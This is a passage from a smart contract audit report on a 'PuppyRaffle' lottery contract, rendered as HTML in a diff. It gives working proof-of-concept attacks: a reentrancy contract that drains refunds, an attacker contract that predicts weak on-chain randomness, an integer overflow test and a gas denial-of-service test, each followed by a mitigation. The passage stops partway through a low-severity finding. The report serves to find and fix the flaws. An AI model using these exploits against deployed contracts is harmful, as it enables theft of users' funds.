+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="fu">constructor</span>(address _puppyRaffle) {</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>        puppyRaffle <span class="op">=</span> <span class="fu">PuppyRaffle</span>(_puppyRaffle)<span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">refund</span>(uint256 _playerIndex) <span class="kw">public</span>{</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        playerIndex<span class="op">=</span>_playerIndex<span class="op">;</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">refund</span>(playerIndex)<span class="op">;</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fallback</span>() external payable{ </span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span> <span class="op">&gt;</span> <span class="dv">0</span>) {<span class="co">// assumes balance is in increments of entrance fee.</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>            puppyRaffle<span class="op">.</span><span class="fu">refund</span>(playerIndex)<span class="op">;</span>        </span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+        <p>If the test fails, the refund loop will not revert, meaning
+        the <code>PuppyRaffle</code> contract will be drained of funds,
+        the test can be ran using:</p>
+        <div class="sourceCode" id="cb3"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--match-test</span> testReenterRefund </span></code></pre></div>
+        <p>Upon running this rest, we are met with a failing test with
+        the following logs:</p>
+        <pre><code>Failing tests:
+Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[FAIL. Reason: call did not revert as expected] testReenterRefund() (gas: 274792)</code></pre>
+        <p><strong>Recommended Mitigation</strong> To solve this issue I
+        reccomend you modify the refund function to follow the checks,
+        effects, interactions (CEI) pattern. Here we ensure that our
+        effects, in this case, removing the player from the players
+        array, happens before our interactions, in this case the call to
+        send the players entrance fee back to them.</p>
+        <div class="sourceCode" id="cb5"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">refund</span>(uint256 playerIndex) <span class="kw">public</span> {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>        address playerAddress <span class="op">=</span> players[playerIndex]<span class="op">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>        <span class="pp">require</span>(playerAddress <span class="op">==</span> msg<span class="op">.</span><span class="at">sender</span><span class="op">,</span> <span class="st">&quot;PuppyRaffle: Only the player can refund&quot;</span>)<span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="pp">require</span>(playerAddress <span class="op">!=</span> <span class="fu">address</span>(<span class="dv">0</span>)<span class="op">,</span> <span class="st">&quot;PuppyRaffle: Player already refunded, or is not active&quot;</span>)<span class="op">;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>       players[playerindex] <span class="op">=</span> <span class="fu">address</span>(<span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">payable</span>(msg<span class="op">.</span><span class="at">sender</span>)<span class="op">.</span><span class="fu">sendValue</span>(entranceFee)<span class="op">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>       players[playerindex] <span class="op">=</span> <span class="fu">address</span>(<span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        emit <span class="fu">RaffleRefunded</span>(playerAddress)<span class="op">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div>
+        <p>Once these changes are made you can rerun the added test from
+        the PoC, which should now pass:</p>
+        <div class="sourceCode" id="cb6"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--match-test</span> testReenterRefund </span></code></pre></div>
+        <p>Logs:</p>
+        <pre><code>Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testReenterRefund() (gas: 265271)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.11ms (450.22µs CPU time)</code></pre>
+        <h4
+        id="h-2-weak-randomness-in-selectwinner-is-exploitable">[H-2]
+        Weak randomness in <code>selectWinner()</code> is
+        exploitable</h4>
+        <p><strong>Description</strong> The contract uses randomness
+        based on predictable elements to select the winner, and the
+        rarity of the winners NFT. Malicious users can exploit this to
+        predict whether they will win or not, and choose whether to call
+        <code>selectWinner()</code> based on this.</p>
+        <p><strong>Impact</strong> This allows users to force a win by
+        only calling <code>selectWinner()</code> when they are certain
+        they will win.</p>
+        <p><strong>Proof of Concept</strong> The following can be placed
+        into the <code>test/PuppyRaffelTest.t.sol</code> file.</p>
+        <p>First, a contract to act as our attacker. The contract must
+        be a ERC721Receiver as the Puppy Raffle uses safeMint:</p>
+        <pre><code>interface IERC721Receiver {
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4);
+}
+
+contract ExploitRandomness is IERC721Receiver{
+    PuppyRaffle puppyRaffle;
+
+    constructor(address _puppyRaffle){
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+    }
+
+    fallback() external payable{}
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+
+    function attack() public{
+        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 5; 
+
+        require(puppyRaffle.players(winnerIndex) == address(this), &quot;You wont win&quot;);
+        puppyRaffle.selectWinner();
+    }
+}</code></pre>
+        <p>Next, the test:</p>
+        <pre><code>    function testExploitRandomness() public playersEntered{
+        vm.startPrank(vm.addr(10));
+        vm.deal(vm.addr(10), entranceFee);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number);
+
+        ExploitRandomness exploitRandomness = new ExploitRandomness(address(puppyRaffle));
+        address[] memory maliciousPlayer = new address[](1);
+        maliciousPlayer[0] = address(exploitRandomness);
+        puppyRaffle.enterRaffle{value:entranceFee}(maliciousPlayer);
+
+        bool success = false;
+        uint256 attempt = 0;
+        while(!success){
+            try exploitRandomness.attack() {
+                success = true;
+                break;
+            } catch{
+                if(attempt &gt; 100) break;
+                attempt++;
+                vm.roll(block.number+attempt);
+                vm.warp(block.timestamp+attempt);
+                vm.prevrandao(keccak256(abi.encodePacked(block.number)));
+            }
+        }
+
+        assertEq(puppyRaffle.previousWinner(), address(0), &quot;User was able to exploit randomness!&quot;);
+    }</code></pre>
+        <p>The test can be ran using
+        <code>forge test --match-test testExploitRandomness</code>.</p>
+        <p>Which results in</p>
+        <pre><code>Failing tests:
+Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[FAIL. Reason: assertion failed] testExploitRandomness() (gas: 513354)</code></pre>
+        <p><strong>Recommended Mitigation</strong> To mitigate this
+        issue, we need to change the way we handle randomness. Instead
+        of relying on on chain data, we should use an oracle such as <a
+        href="https://docs.chain.link/vrf">Chainlink VRF</a>.</p>
+        <h4 id="h-3-integer-overflow-of-totalfees-loses-fees">[H-3]
+        Integer overflow of <code>totalFees</code> loses fees</h4>
+        <p><strong>Description</strong> Prior to solidity version
+        <code>0.8.0</code> integer were vulnerable to integer
+        overflow.</p>
+        <div class="sourceCode" id="cb11"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">chisel</span></span></code></pre></div>
+        <div class="sourceCode" id="cb12"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>uint64 myVar <span class="op">=</span> <span class="fu">type</span>(uint64)<span class="op">.</span><span class="at">max</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="co">// 18446744073709551615</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>myVar <span class="op">=</span> myVar <span class="op">+</span> <span class="dv">1</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="co">// 0</span></span></code></pre></div>
+        <p><strong>Impact</strong> fees are accumulated in
+        <code>selectWinner()</code> for <code>feeAddress</code> to
+        collect at a later through <code>withdrawFees</code>. However,
+        if the <code>totalFees</code> variable overflows, the
+        <code>feeAddress</code> will not be able to collect all the fees
+        they are owed, leaving them permanently stuck in the
+        contract.</p>
+        <p><strong>Proof of Concept</strong> 1. We conclude a raffle of
+        4 players 2. We then have 89 players enter a new raffle 3.
+        <code>totalFees</code> will be:</p>
+        <div class="sourceCode" id="cb13"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>totalFees <span class="op">=</span> totalFees <span class="op">+</span> <span class="fu">uint64</span>(fee)<span class="op">;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="co">// substituted</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>totalFees <span class="op">=</span> <span class="dv">800000000000000000</span> <span class="op">+</span> <span class="dv">17800000000000000000</span><span class="op">;</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co">// due to overflow, the following is now the case</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>totalFees <span class="op">=</span> <span class="dv">153255926290448384</span><span class="op">;</span></span></code></pre></div>
+        <ol start="4" type="1">
+        <li>You will not be able to withdraw in
+        <code>widthrawFees()</code> due to:</li>
+        </ol>
+        <div class="sourceCode" id="cb14"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="pp">require</span>(<span class="fu">address</span>(<span class="kw">this</span>)<span class="op">.</span><span class="at">balance</span> <span class="op">==</span> <span class="fu">uint256</span>(totalFees)<span class="op">,</span> <span class="st">&quot;PuppyRaffle: There are currently players active!&quot;</span>)<span class="op">;</span></span></code></pre></div>
+        <p>The code:</p>
+        <div class="sourceCode" id="cb15"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">testTotalFeesOverflow</span>() <span class="kw">public</span> playersEntered {</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We finish a raffle of 4 to collect some fees</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        uint256 startingTotalFees <span class="op">=</span> puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>()<span class="op">;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// startingTotalFees = 800000000000000000</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We then have 89 players enter a new raffle</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        uint256 playersNum <span class="op">=</span> <span class="dv">89</span><span class="op">;</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](playersNum)<span class="op">;</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> playersNum<span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>            players[i] <span class="op">=</span> <span class="fu">address</span>(i)<span class="op">;</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> playersNum}(players)<span class="op">;</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We end the raffle</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>        <span class="co">// And here is where the issue occurs</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We will now have fewer fees even though we just finished a second raffle</span></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>        uint256 endingTotalFees <span class="op">=</span> puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>()<span class="op">;</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;ending total fees&quot;</span><span class="op">,</span> endingTotalFees)<span class="op">;</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assert</span>(endingTotalFees <span class="op">&lt;</span> startingTotalFees)<span class="op">;</span></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We are also unable to withdraw any fees because of the require check</span></span>
+<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">prank</span>(puppyRaffle<span class="op">.</span><span class="fu">feeAddress</span>())<span class="op">;</span></span>
+<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">expectRevert</span>(<span class="st">&quot;PuppyRaffle: There are currently players active!&quot;</span>)<span class="op">;</span></span>
+<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">withdrawFees</span>()<span class="op">;</span></span>
+<span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div>
+        <p><strong>Recommended Mitigation</strong> There are two
+        mitigations: 1. Use a new version of solidity to solve
+        overflows, and <code>uint256</code> instead of
+        <code>uint64</code> for <code>totalFees</code> 2. Remove the
+        balance check from <code>withdrawFees()</code></p>
+        <div class="sourceCode" id="cb16"><pre
+        class="sourceCode diff"><code class="sourceCode diff"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="st">-require(address(this).balance == uint256(totalFees), &quot;PuppyRaffle: There are currently players active!&quot;);</span></span></code></pre></div>
+        <h3 id="medium-severity-findings">Medium Severity Findings</h3>
+        <h4
+        id="m-1-nested-loop-inside-enterraffle-create-a-dos-vulnerability">[M-1]
+        Nested loop inside <code>enterRaffle()</code> create a DoS
+        vulnerability</h4>
+        <p><strong>Description</strong> There is a nested for loop
+        inside <code>enterRaffle()</code> which is used to check for
+        duplicate addresses within the <code>players</code> array, due
+        to excessive gas build up when the players array is large, the
+        functionality to enter the raffle can be denied.</p>
+        <div class="sourceCode" id="cb17"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Check for duplicates</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> players<span class="op">.</span><span class="at">length</span> <span class="op">-</span> <span class="dv">1</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> (uint256 j <span class="op">=</span> i <span class="op">+</span> <span class="dv">1</span><span class="op">;</span> j <span class="op">&lt;</span> players<span class="op">.</span><span class="at">length</span><span class="op">;</span> j<span class="op">++</span>) {</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>                <span class="pp">require</span>(players[i] <span class="op">!=</span> players[j]<span class="op">,</span> <span class="st">&quot;PuppyRaffle: Duplicate player&quot;</span>)<span class="op">;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>        }</span></code></pre></div>
+        <p><strong>Impact</strong> This allows a malicious wealthy user
+        to enter the raffle with many addresses, increasing the cost of
+        entering the raffle to all whom wish to enter after them,
+        effectively denying access to the <code>enterRaffle()</code>
+        function and greatly increasing if not guaranteeing the
+        malicious user wins the raffle.</p>
+        <p><strong>Proof of Concept</strong> We can utilize the
+        <code>PuppyRaffle</code> test suite to create a proof of concept
+        for this issue. We will add a test which enters the raffle 100
+        times, caches the gas used, and then enters another 100 times
+        and compares the end gas usage to the start gas usage. Place the
+        following inside <code>test/PuppyRaffleTest.t.sol</code>:</p>
+        <div class="sourceCode" id="cb18"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">testEnterRaffleDos</span>() <span class="kw">public</span>{</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">prank</span>(<span class="fu">address</span>(<span class="dv">1</span>))<span class="op">;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">deal</span>(<span class="fu">address</span>(<span class="dv">1</span>)<span class="op">,</span> <span class="dv">10000</span> ether)<span class="op">;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">txGasPrice</span>(<span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>        uint count <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](count)<span class="op">;</span></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span>(uint i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> count<span class="op">;</span> i<span class="op">++</span>){</span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>            players[i]<span class="op">=</span>(<span class="fu">address</span>(i))<span class="op">;</span></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>        uint gasStart <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span>count<span class="op">*</span>puppyRaffle<span class="op">.</span><span class="fu">entranceFee</span>()}(players)<span class="op">;</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a>        uint gasEnd <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a>        uint gasUsedFirst <span class="op">=</span> (gasStart<span class="op">-</span>gasEnd)<span class="op">*</span> tx<span class="op">.</span><span class="at">gasprice</span><span class="op">;</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;First Gas: &quot;</span><span class="op">,</span> gasUsedFirst)<span class="op">;</span></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span>(uint i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> count<span class="op">;</span> i<span class="op">++</span>){</span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a>            players[i]<span class="op">=</span>(<span class="fu">address</span>(i<span class="op">+</span>count))<span class="op">;</span></span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>        uint gasStartSecond <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span>count<span class="op">*</span>puppyRaffle<span class="op">.</span><span class="fu">entranceFee</span>()}(players)<span class="op">;</span></span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>        uint gasEndSecond <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>        uint gasUsedSecond <span class="op">=</span> (gasStartSecond<span class="op">-</span>gasEndSecond)<span class="op">*</span> tx<span class="op">.</span><span class="at">gasprice</span><span class="op">;</span></span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Second Gas: &quot;</span><span class="op">,</span>gasUsedSecond)<span class="op">;</span></span>
+<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div>
+        <p>Note: Due to the nature of this attack, no test success
+        criteria is set, we will instead rely on console logs to verify
+        the vulnerabilities legitimacy</p>
+        <p>Now that the test is inside the test suite, it can be ran
+        using:</p>
+        <div class="sourceCode" id="cb19"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--match-test</span> testEnterRaffleDos <span class="at">-vvv</span></span></code></pre></div>
+        <p>Within the <code>Logs</code> section of the output, we see
+        the following:</p>
+        <pre><code>Logs:
+  First Gas:  6250668
+  Second Gas:  18068372</code></pre>
+        <p>As you can see, the gas after the second 100 players has been
+        added is dramatically higher then the first 100 players. Meaning
+        that the gas cost will increase dramatically as more players
+        enter the contest, either legitimately or illegitimately.</p>
+        <p><strong>Recommended Mitigation</strong> There are two
+        potential mitigations I think you should consider:</p>
+        <ol type="1">
+        <li>You may consider removing the check for duplicates, and
+        removing the invariant that you can have an address enter the
+        raffle multiple times. This is because if a user wants to enter
+        the raffle multiple times, they can just create multiple
+        addresses anyway. Also, in the docs you acknowledge this:</li>
+        </ol>
+        <pre><code>1. Call the enterRaffle function with the following parameters:
+    i. address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
+2. Duplicate addresses are not allowed</code></pre>
+        <p>You mention that you can enter yourself multiple times but
+        also that duplicate addresses are not allowed, which seems like
+        a contradiction. If you choose to go with this mitigation you
+        can safely remove the nested for loop checking for duplicates
+        from <code>enterRaffle()</code>.</p>
+        <ol start="2" type="1">
+        <li>If you wish to keep the duplicate address check
+        functionality, you may consider switching from a
+        <code>players</code> array to a
+        <code>playerAddress=&gt;playerId</code> mapping, this would
+        allow you to only loop through the <code>newPlayers</code> array
+        parameter for <code>enterRaffle()</code> and check whether that
+        player is in the raffle in constant time.</li>
+        </ol>
+        <h4
+        id="m-2-smart-contract-wallets-without-a-recieve-function-will-revert-if-they-win-the-raffle">[M-2]
+        Smart contract wallets without a <code>recieve</code> function
+        will revert if they win the raffle</h4>
+        <p><strong>Description</strong> If a smart contract is the
+        selected as a raffle winner through <code>selectWinner()</code>
+        then they must have a <code>receive</code> function of the
+        <code>selectWinner()</code> call will revert when they attempt
+        to send the contract the winnings.</p>
+        <p><strong>Impact</strong> This wastes gas and potentially makes
+        it difficult to select a winner if a large amount of the players
+        are smart contracts without receive functions.</p>
+        <p><strong>Recommended Mitigation</strong> I recommend creating
+        a mapping of winner addresses -&gt; winnings, so winner
+        addresses can pull out their funds themselves with a new
+        <code>claimWinnings</code> function call.</p>
+        <h3 id="low-severity-findings">Low Severity Findings</h3>
+        <h4
+        id="l-1-getactiveplayerindex-returns-0-when-player-is-not-active-despite-0-being-a-valid-player-index">[L-1]
+        <code>getActivePlayerIndex()</code> returns <code>0</code> when
+        player is not active, despite <code>0</code> being a valid
+        player index</h4>
+        <p><strong>Description</strong> The function returns
+        <code>0</code> if no player is found, however there will always
+        be a player at index <code>0</code>, if this player uses this
